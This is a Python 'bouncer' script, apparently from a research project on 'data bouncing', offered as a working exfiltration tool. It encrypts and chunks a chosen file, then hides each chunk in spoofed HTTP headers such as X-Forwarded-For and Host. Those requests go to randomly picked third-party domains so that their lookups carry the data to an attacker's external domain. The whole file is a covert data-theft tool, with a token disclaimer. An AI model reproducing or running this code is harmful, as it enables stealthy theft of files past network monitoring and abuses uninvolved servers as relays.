#!/usr/bin/env python

# A bouncer script for/from John & Dave's Data-Bouncing project:	https://thecontractor.io/data-bouncing/
# This script will send the exfiltrated data in encrypted chunks.
# Have fun, dont do anything illegal... Seriously... don't. 

import getopt
import hashlib
import os
import sys
import base64
import random
import requests

from cryptography.fernet import Fernet


# Global variables
# Some can be changed on the command line, at some point they will be changed using a config file too
CHUNK_SIZE = 63  # Size of data chunk in bytes
proxy_add = "127.0.0.1:8080"
proxies = {"http": "http://" + proxy_add, "https": "http://" + proxy_add,}  # System proxies (not used yet)

domains_file = "gov.domains.txt"    # File with list of target domains

# Global vars, configured by user on command line
file_path = ""
uuid_key = ""
password = ""
exfil = ""
num_times = 1
verbose = False
output_file = "output.json"
key_file = "keyfile.key"


# Print usage
def usage():
    print("Bouncer - Send file chunks via headers")
    print()
    print("Usage: bouncer.py -e <external_domain> -p <password> [options]")
    print("-f --file <filename>\t\t\tPath to the file to exfiltrate")
    print("-p --password <password>\t\tPassword for AES encryption")
    print("-u --uuid <uuid_key>\t\t\tUUID key for the file")
    print("-e --exfil <external_domain>\t\tExternal domain suffix for headers")
    print("-n --number-of-times <number>\t\tNumber of times to send each chunk (default=1)")
    print("-x --proxy <proxy_address>\t\tIP address or URL of proxy")
    print("-v --verbose\t\t\t\tExecute in verbose mode.")
    print("-h --help\t\t\t\tShow this help.")
    print()
    sys.exit(0)


# Check commandline args and replace any defaults with specified args
def parse_cmdline_args():

    arg_list = sys.argv[1:]
 
	# Options
    options = "f:u:p:e:n:x:hv"
	# Long options
    long_options = ["file", "password", "uuid", "exfil", "number-of-times", "key-file", "proxy", "help", "verbose"]
	 
    try:
	    # Parse args
        arguments, vals = getopt.getopt(arg_list, options, long_options)
    except getopt.error as err:
		# Output error, and exit
        print (str(err))
        usage()
		
    # checking each argument
    for current_arg, current_val in arguments:
        if current_arg in ("-h", "--help"):
            usage()
        elif current_arg in ("-f", "--file"):
            globals()["file_path"] =  current_val
        elif current_arg in ("-p", "--password"):
            # Specify OOB domain
            globals()["password"] = current_val
        elif current_arg in ("-u", "--uuid"):
            # Specify the UUID
            globals()["uuid_key"] =  current_val
        elif current_arg in ("-e", "--exfil"):
            # Provide an exfiltration domain
            globals()["exfil"] =  current_val
        elif current_arg in ("-n", "--number-of-times"):
            # Check the user has provided a valid number, and set number of iterations
            if current_val > 0:
                globals()["num_times"] =  current_val
        elif current_arg in ("-p", "--proxy"):
            # Set address:port for proxy
            globals()["proxy_add"] =  current_val
        elif current_arg in ("-v", "--verbose"):
            # Verbose output
            globals()["verbose"] = True

    # Check that user has provided suitable params
    if globals()["exfil"] == "":
        print("Provide an exfiltration domain.")
        exit(1)
    if globals()["uuid_key"] == "":
        print("Provide a UUID key for your data.")
        exit(1)
	# Check if domains.txt file exists
    if not os.path.isfile(globals()["file_path"]):
        print("File '" + file_path + "' not found! Unable to continue...")
        exit(1)


# Fernet encryption for smuggled data
def encrypt_data(data):

    key = Fernet.generate_key()
    fernet = Fernet(key)

    # Key will be needed for decryption, so it must be recorded/saved
    print("Key: " + str(key))
    print(type(key))
    print(len(key))
    sys.stdout.flush()
    with open(key_file, "wb") as out_file:  # Save key as binary data
        out_file.write(key)
    out_file.close()

    encrypted_data = fernet.encrypt(data)

    return encrypted_data


# Send a request in chunks
def send_chunked_request(data, domain, prefix, exfil, file_id, chunk_id, total_chunks, uuid_key):

    all_headers = {}
    url = f"http://{domain}/"

    # Set a suitable user-agent
    UA = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15"
    }
    
    # Map the possible prefixes onto corresponding header values
    header_map = {
        "host": "Host",
        "xff": "X-Forwarded-For",
        "ref": "Referer",
        "cfcon": "CF-Connecting_IP", 
        "contact": "Contact",
		"rip": "X-Real-IP", 
        "trip": "True-Client-IP", 
        "xclip": "X-Client-IP",
        "ff": "Forwarded",
	    "origip": "X-Originating-IP",
        "clip": "Client-IP", 
        "from": "From:"
    } 

    # Create payload
    modified_data = f"{uuid_key}.{file_id}.{chunk_id}.{total_chunks}.{data}.{exfil}"


    # Create a map of specified header onto modified header values to be passed into request
    modified_headers = {header_map[prefix]: modified_data}

    # Merge dictionaries into single dictionary of headers for the request
    all_headers.update(UA)
    all_headers.update(modified_headers)

    # Inform user of progress
    if globals()["verbose"] == True:
        print(f"URL: {url}")
        print(f"Prefix:  {prefix}")
        print(f"Headers: {all_headers}")
    
    # Make the request. Ignore redirects by setting allow_redirects to False
    try:
        # At some point modify this to allow other request types (post, head, options, etc.)
        # Insert proxies here at some point - probably needs cmd line param to determine if proxies needed or not
        response = requests.get(url, headers=all_headers, verify=False, allow_redirects=False, stream=True)
        response.close()

    except requests.RequestException:
        if globals()["verbose"] == True:
            print("Exception getting response from: " + url)


# Send chunks
def send_file_chunks():

    # Read the data from target file, exit if there are issues
    try:
        with open(globals()["file_path"], "rb") as file_handle:
            binary_data = file_handle.read()

            # Encrypt target data with the generated key, then encode
            encrypted_data = encrypt_data(binary_data)
            file_data = base64.b32encode(encrypted_data).decode("utf-8").rstrip("=")
    except:
        print("Error reading target file!")
        exit(1)

    # ToDo: at some point consider what to do about larger files. How big before performance issue occurs?

    file_hash = hashlib.sha1(binary_data).hexdigest()

    # Break encrypted data into chunks ready for distribution
    chunks = [file_data[i:i+globals()["CHUNK_SIZE"]] for i in range(0, len(file_data), globals()["CHUNK_SIZE"])]
    num_chunks = len(chunks)

    # Iterate through 'clean' domains file and build an array of 'clean' domains
    with open(globals()["domains_file"], "r") as file_handle:
        domains = file_handle.readlines()

    # Choose a domain from the array
    chosen_domain = random.choice(domains).strip()
    prefix, target_domain = chosen_domain.split('.', 1)

    # Send request for the number of times specified by user
    for iteration in range(globals()["num_times"]):
        for idx, chunk in enumerate(chunks, start=1):
            send_chunked_request(chunk, target_domain, prefix, globals()["exfil"], file_hash[:10], idx, num_chunks, globals()["uuid_key"])


if __name__ == "__main__":

    # Get any args from cmdline
    parse_cmdline_args()

    # Suppress warnings
    requests.packages.urllib3.disable_warnings()

    # Send those chunks!
    send_file_chunks()
